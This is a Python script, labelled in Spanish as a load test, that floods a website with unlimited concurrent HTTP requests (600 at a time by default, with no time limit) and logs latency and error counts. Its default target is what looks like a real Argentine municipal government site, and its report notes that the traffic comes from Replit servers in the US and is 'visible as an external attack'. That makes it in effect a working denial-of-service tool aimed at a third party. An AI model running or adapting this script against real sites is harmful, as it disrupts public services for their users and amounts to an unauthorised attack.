import asyncio
import aiohttp
import time
import os
from datetime import datetime

from dotenv import load_dotenv
load_dotenv()

TARGET_URL = os.getenv('TARGET_URL', 'https://diaz.gob.ar/')
MAX_CONCURRENT = int(os.getenv('MAX_CONCURRENT', '600'))
DURATION_SECONDS = int(os.getenv('DURATION_SECONDS', '0'))

async def fetch(session, semaphore):
    async with semaphore:
        start = time.time()
        try:
            async with session.get(TARGET_URL, timeout=20) as resp:
                latency = time.time() - start
                return {'status': resp.status, 'latency': latency, 'error': None}
        except Exception as e:
            latency = time.time() - start
            return {'status': None, 'latency': latency, 'error': str(e)[:100]}

async def run_load_test():
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
    timeout = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=connector,
                                     timeout=timeout) as session:
        start_time = time.time()
        total_sent = 0
        results = []
        print(f"=== PRUEBA DE CARGA INICIADA ===")
        print(f"Objetivo: {TARGET_URL}")
        print(f"Concurrencia: {MAX_CONCURRENT}")
        print(f"Duración: {'ilimitada' if DURATION_SECONDS == 0 else f'{DURATION_SECONDS}s'}")

        while (DURATION_SECONDS == 0 or
               time.time() - start_time < DURATION_SECONDS):
            task = asyncio.create_task(fetch(session, semaphore))
            results.append(task)
            total_sent += 1
            if total_sent % 200 == 0:
                print(f"Enviados {total_sent} requests...")
            await asyncio.sleep(0)

        print("Finalizando tasks pendientes...")
        completed_results = await asyncio.gather(*results)

    return completed_results, total_sent, time.time() - start_time

def generate_report(results, total_sent, elapsed):
    total = len(results)
    successes = sum(1 for r in results if r['status'] == 200)
    errors = total - successes
    latencies = [r['latency'] for r in results if r['latency']]

    avg_lat = sum(latencies) / len(latencies) if latencies else 0
    min_lat = min(latencies) if latencies else 0
    max_lat = max(latencies) if latencies else 0
    rps = total_sent / elapsed if elapsed > 0 else 0

    report = f"""
=== REPORTE FINAL - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===
Duración: {elapsed:.1f} segundos
Requests enviados: {total_sent}
Requests completados: {total}
Éxitos (200 OK): {successes}
Errores/Timeouts: {errors}
Latencia mínima: {min_lat:.3f}s
Latencia promedio: {avg_lat:.3f}s
Latencia máxima: {max_lat:.3f}s
RPS aproximado: {rps:.1f}
Concurrencia máxima usada: {MAX_CONCURRENT}
IP origen: Infraestructura Replit (EE.UU.) - visible como ataque externo
"""
    print(report)
    with open('results.log', 'a') as f:
        f.write(report + '\n' + '='*60 + '\n')

if __name__ == '__main__':
    results, sent, duration = asyncio.run(run_load_test())
    generate_report(results, sent, duration)
    print("Prueba finalizada. Reporte guardado en results.log")

